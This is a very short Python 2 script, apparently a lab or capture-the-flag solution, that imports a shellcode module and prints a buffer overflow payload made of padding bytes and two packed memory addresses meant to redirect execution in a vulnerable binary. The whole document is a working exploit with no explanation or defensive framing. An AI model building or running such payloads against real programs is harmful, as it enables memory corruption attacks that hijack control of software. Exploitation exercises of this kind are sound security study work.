from shellcode import shellcode
from struct import pack

print "A"*22+pack("<I",0x804a030) +"A"*4+pack("<I", 0x80c61e5)
